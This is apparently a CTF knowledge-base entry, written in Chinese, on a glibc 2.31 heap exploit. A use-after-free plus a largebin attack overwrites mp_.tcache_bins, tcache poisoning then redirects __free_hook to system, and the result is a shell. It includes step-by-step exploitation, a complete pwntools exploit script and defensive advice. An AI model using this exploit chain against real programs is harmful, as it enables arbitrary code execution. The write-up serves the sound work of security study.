---
id: binary-pwn-heap-uaf-largebin-mp-tcache-bins-freehook-system
title: glibc 2.31 UAF 堆题：largebin attack 覆写 mp_.tcache_bins 让 large chunk 进 tcache，毒化 __free_hook 为 system
type: scenario
domain: binary
path: binary/pwn/heap
technique: largebin-attack-mp-tcache-bins-freehook
aliases:
- largebin attack mp_
- mp_.tcache_bins 放大
- large chunk 进 tcache
- delete recover UAF
- 大堆块 tcache 越界索引
- __free_hook 覆写
- PassWordBox ProVersion
- pi SDPCTF
tags:
- pwn
- heap
- glibc
- largebin
- tcache
- mp
- uaf
- free-hook
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V650
  verified_at: '2026-11-13T05:01:15+08:00'
  notes: 已对照原文与全部17图核对：add 限 0x41F<size<=0x888（图3）、delete 置位/recover 复位成 UAF（图5-7）、XOR key 泄露与 libc=leak^key-0x1ECB80-106、mp_=libc+0x1EC280、tcache_bins=&mp_+0x50（图11 p 命令验证）、largebin attack 写 mp_+0x80（图12）、__free_hook 毒化（图13）、shell ls 成功（图14）；pi 例题 0x41F<size<=0x550（图17）与直接 UAF（图16）亦一致。修正：PoC 骨架补上缺失的 recover() 求助函数（原文第一题菜单第5项），否则无法运行。未验证点：原文未显式标注 glibc 版本，2.31 系统为按偏移/hook 推断；PoC 中 free_hook=0x1EEB28 为示意值需按实际 libc 核对；frontmatter 无 sources/source_url；未设 affected_versions（原文未给影响区间）。
---

## 一句话结论

当堆题只允许申请 large bin 大小（约 0x41F 以上）的 chunk、且存在 UAF 时，可以用 largebin attack 把 libc 中 `mp_.tcache_bins`（tcache bin 索引上限，默认 64）覆盖成一个很大的堆指针，使这些大 chunk 的释放也被 tcache 接管（tc_idx 超过 64，越界访问 counts/entries）；再借 UAF 改写已释放 chunk 的 tcache next 指针为 `__free_hook`，两次 malloc 即把 `__free_hook` 分配出来写成 `system`，free 一个内容为 `"/bin/sh"` 的块完成 getshell。

## 原理

- **程序侧原语（以原文例题 PassWordBox_ProVersion 为例）**：`delete` 在 free 后将状态位 `dword_407C[idx]` 置 0；`recover` 只把该位重新置 1，**不检查堆块是否已释放**。于是 `delete` 后调用 `recover` 即可对已释放 chunk 继续 `edit`/`show`，形成稳定 UAF 读写。申请大小被限制在 `0x41F < size <= 0x888`，这些尺寸的 chunk 在释放时既进不了 fastbin/small bin（大于 tcache 默认上限），也会落入 large bin 范围，正好满足本手法前提。
- **libc 泄露**：程序对存放的密码做逐字节/逐块简单 XOR 加密后输出。先构造首 8 字节全 0 的密文，输出即等于密钥；再 `delete` 后 `recover` 并用 `show` 读已释放 chunk，其 user data 开头已被 unsorted bin 的 `fd` 指针（`main_arena` 附近）覆盖，用密钥异或解密即可算 libc 基址。原文公式 `libc_base = (leak ^ key) - 0x1ECB80 - 106`（`- 106` 为该校验/输出路径的固定修正，需按目标 libc 重核）。
- **largebin attack 写点**：把一个位于 large bin 的 chunk 的 `bk_nextsize` 改成 `目标地址 - 0x20`，再向同一 large bin 插入一个更小的 chunk。走「小于链中最小块」分支时执行 `victim->bk_nextsize->fd_nextsize = victim`（另一处同时写 `fwd->fd->bk_nextsize`），即在 `bk_nextsize + 0x20` 处写入 victim 的 chunk 指针。该分支只对原 unsorted 链表的 `fd/bk` 做双向链表一致性检查，**不检查 `fd_nextsize/bk_nextsize`**，因此伪造的 `bk_nextsize` 不会被发现。
- **为什么改 `mp_.tcache_bins`**：`mp_` 是 libc 的 `malloc_par`，`tcache_bins`（本例偏移 `mp_+0x50`）决定 malloc/free 走 tcache 的最大 bin 索引，判断条件是 `tc_idx < mp_.tcache_bins`。把它改成一个很大的堆地址后，0x450 这类大 chunk 的 `tc_idx`（约 0x43/0x44，已超过 `TCACHE_MAX_BINS=64`）也满足条件，free 时进入 tcache；`tcache_perthread_struct` 的 `counts[64]`/`entries[64]` 数组被越界索引访问，落到 `tcache_perthread_struct` 之后的堆数据上。只要这些位置可写/初值为 0（counts 检查 `tcache->counts[tc_idx] < mp_.tcache_count` 通过），大 chunk 就能经越界槽位被 tcache 管理。
- **任意地址分配**：glibc 2.31 的 tcache next 指针未做 safe-linking 编码，UAF `edit` 直接把已释放 chunk 的 next 写成 `__free_hook`；随后两次同尺寸 `malloc`，第二次返回 `__free_hook` 地址，写入 `system` 即可。
- **为什么成立**：largebin attack 只提供「任意地址写一个 chunk 指针」，选择 `mp_` 这种分配器全局结构可以改变 tcache 的准入逻辑，把「无法用 tcache 的大尺寸」变成「可用 tcache」，从而获得任意地址分配；`__free_hook` 在 glibc ≤2.33 存在，free 时以 chunk 指针为参数调用 hook，配合 `"/bin/sh"` 直接 getshell，无需 ROP。
- **版本说明**：原文未显式标注 glibc 版本；从 `mp_ = libc+0x1EC280`、`tcache_bins = mp_+0x50`、使用 `__free_hook` 且 tcache fd 无需编码看，对应 2.31 系列。2.32+ 引入 safe-linking 需编码 next；2.34+ 移除 `__free_hook`，尾链需改为 FSOP/栈 ROP 等。

## 触发条件

- glibc 2.31 类环境（有 `__free_hook`、tcache next 无 safe-linking），可由 libc 基址算出 `mp_`、`__free_hook` 偏移。
- 程序能申请 large bin 范围的 chunk（原文约 `0x41F < size <= 0x888`），释放后不会进入 tcache（默认上限内尺寸限制死）。
- 存在 UAF（本例为 `delete` 置位、`recover` 复位但不校验已释放状态，可重复 edit/show 已释放块）。
- 能泄露 libc 基址与至少一个堆指针（largebin attack 需要堆地址参与链表；原文通过 UAF 读 large bin 内容获得）。
- 程序使用 free 且未启用 `MALLOC_CHECK_` 等检测；有 `__free_hook` 可写（glibc ≤2.33）。

## 利用步骤

1. 首次 add 一个 large chunk（原文 0x460），利用「首 8 字节明文为 0 时密文等于 XOR 密钥」泄露加密密钥。
2. add 两个 0x450 chunk；`delete(0); recover(0); show(0)` 通过 UAF 读出 unsorted bin 的 `fd`（`main_arena` 附近指针），异或解密并减去原文偏移（0x1ECB80 与修正 106）得 libc 基址。
3. add 一个 0x600 chunk，触发 malloc 把 unsorted bin 中的 chunk 0 归入 large bin；随后 `delete(2); recover(2)` 把 chunk 2 放进 unsorted bin 备用。
4. UAF `edit(0, p64(0)*3 + p64(mp_+0x50-0x20))`：改写 chunk 0 的 `bk_nextsize` 指向 `mp_.tcache_bins - 0x20`。
5. add 0x600 chunk 触发 largebin attack（chunk 2 被插入同一 large bin 的「更小」分支），`mp_.tcache_bins` 被写成 chunk 指针（一个很大的值）。
6. `delete(1); delete(2); recover(2)`：此时大 chunk 释放会进入 tcache（越界 tc_idx）；UAF `edit(2, p64(__free_hook))` 把 chunk 2 的 tcache next 改成 `__free_hook`。
7. 两次 `add(0x450)`：第一次取回 chunk 2，第二次 malloc 返回 `__free_hook`；`edit(2, p64(system))` 写入 system，`edit(1, "/bin/sh")` 把 shell 字符串写进 chunk。
8. `delete(1)` 触发 `__free_hook(chunk) = system(chunk)`，执行 `system("/bin/sh")`。

## PoC

原文两题（PassWordBox_ProVersion、SDPCTF pi）exp 结构相同，以下为合并后的最小骨架（偏移按原文 libc，需按目标重核）：

```python
from pwn import *
context(arch='amd64')

def add(size, idx, content):
    io.sendlineafter(b'>> ', b'1')
    io.sendlineafter(b'HOw much?\n', str(size).encode())
    io.sendlineafter(b'which?\n', str(idx).encode())
    io.sendlineafter(b'Content:\n', content)
def delete(idx):
    io.sendlineafter(b'>> ', b'2')
    io.sendlineafter(b'which one?\n', str(idx).encode())
def show(idx):
    io.sendlineafter(b'>> ', b'3')
    io.sendlineafter(b'which one?\n', str(idx).encode())
def edit(idx, content):
    io.sendlineafter(b'>> ', b'4')
    io.sendlineafter(b'which one?\n', str(idx).encode())
    io.sendlineafter(b'content:\n', content)
def recover(idx):  # 第一题菜单第 5 项；pi 无 recover，delete 后可直接 UAF
    io.sendlineafter(b'>> ', b'5')
    io.sendlineafter(b'Idx you want 2 Recover:\n', str(idx).encode())

# 1) XOR key leak
add(0x460, 0, b'\n')
io.recvuntil(b'Save ID:')
key = u64(io.recv(8))

# 2) libc leak via delete+recover UAF
add(0x450, 1, b'\n'); add(0x450, 2, b'\n')
delete(0); recover(0); show(0)
io.recvuntil(b'Pwd is: ')
libc_base = (u64(io.recv(8)) ^ key) - (0x1ECB80 + 106)

# 3) put chunk0 into largebin, chunk2 into unsorted
add(0x600, 3, b'\n')
delete(2); recover(2)

mp          = libc_base + 0x1EC280
tcache_bins = mp + 0x50
free_hook   = libc_base + 0x1EEB28      # libc.sym['__free_hook']
system      = libc_base + libc.sym['system']

# 4) forge bk_nextsize
edit(0, p64(0) * 3 + p64(tcache_bins - 0x20))

# 5) trigger largebin attack -> mp_.tcache_bins = heap ptr
add(0x600, 4, b'\n')

# 6) large chunks now land in tcache; poison next -> __free_hook
delete(1); delete(2); recover(2)
edit(2, p64(free_hook))

# 7) malloc out __free_hook and overwrite with system
add(0x450, 1, b'\n')
add(0x450, 2, b'\n')
edit(2, p64(system))
edit(1, b'/bin/sh\x00')
delete(1)
io.interactive()
```

注：原文 PoC 中的 `recover` 函数第一题叫 Recover（第 5 项），第二题 pi 直接 `delete` 后不置空指针即可 UAF；`__free_hook` 偏移原文用 `libc.sym` 取，上面的 `0x1EEB28` 为 2.31 常见值，仅示意需按实际 libc 核对。原文运行截图显示 `ls` 成功的 shell，链路已打通。

## 变体与关联

- 同首段不同尾链（glibc 2.39，无 hook）：`binary-pwn-heap-largebin-attack-mp-tcache-bins-stack-rop`（改 `mp_.tcache_bins` 后 safe-linking 毒化 environ→栈 ROP）、`binary-pwn-heap-leakless-mp-tcache-bins-stdout-fsop`（无 show 时用越界索引直接把 stdout 分配出来走 FSOP）。
- largebin attack 版本差异与检查点：`binary-pwn-heap-largebin-attack-version-diff-smaller-insert-bypass`、`binary-pwn-heap-largebin-attack-glibc231-middle-insert-checks`。
- 其他 `__free_hook→system` 尾链：`binary-pwn-heap-glibc231-fastbin-stash-tcache-freehook-system`、`binary-pwn-heap-glibc231-tcache-key-clear-repeated-free-freehook`。
- 变体：若目标为 2.32–2.33，tcache next 需 safe-linking 编码（`(pos>>12) ^ target`）；若 ≥2.34 无 `__free_hook`，可改打 `_IO_list_all`/stdout FSOP 或 `environ`→栈返回地址 ROP；若程序无 XOR 加密，libc 泄露可直接从 unsorted bin 读出。
- 关联原语：`mp_.tcache_bins` 也可用 unsorted bin attack/其他任意写放大；`delete→recover` 型 UAF 是「状态位与真实释放状态分离」的常见 CTF 出题模式。

## 检测与防御

- 代码层：free 后立即将指针置空，`recover`/复用路径必须校验块是否仍在自由链表，不能只靠状态位；show/edit 访问前检查块状态；限制 size 范围时不要假设「大块进不了 tcache」就安全。
- 分配器层：升级 glibc（2.32+ safe-linking、2.34+ 移除 hook）可提高门槛但不能消除原理；启用 `MALLOC_CHECK_=3`、ASAN、Scudo/Hardened malloc 检测堆元数据异常。
- 检测信号：`mp_`/`malloc_par.tcache_bins` 被写成异常大值；tcache 越界索引访问（`tc_idx ≥ 64`）；`__free_hook` 被改写为非 libc 函数（system/one_gadget）；进程在 free 时执行意外命令。
- 防御边界：Full RELRO/PIE/Canary/NX 均挡不住本链；关键是消除 UAF/任意写原语并跟进 allocator 版本。
